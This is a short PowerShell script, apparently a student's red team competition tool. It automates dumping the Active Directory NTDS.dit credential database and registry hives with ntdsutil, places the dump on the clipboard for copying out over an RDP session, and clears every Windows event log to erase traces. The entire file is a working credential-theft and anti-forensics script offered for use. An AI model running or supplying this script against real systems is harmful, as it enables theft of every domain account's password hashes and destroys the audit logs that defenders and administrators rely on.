# Alex Rosse
# amr3499@rit.edu
# CDT Red Team Tool
# Automated NTDS.dit dump designed to be used over RDP

# Use ntdsutil to create a copy of the 
# NTDS.dit and regisrey keys in a folder called C:\Windows\NTSD
ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\NTSD' q q

# Automatically copy this folder to the clipboard so a user can 
# easly paste it onto thier own desktop
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Collections.Specialized.StringCollection
$f.Add('C:\Windows\NTSD')
[System.Windows.Forms.Clipboard]::SetFileDropList($f)

# Clear the logs
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
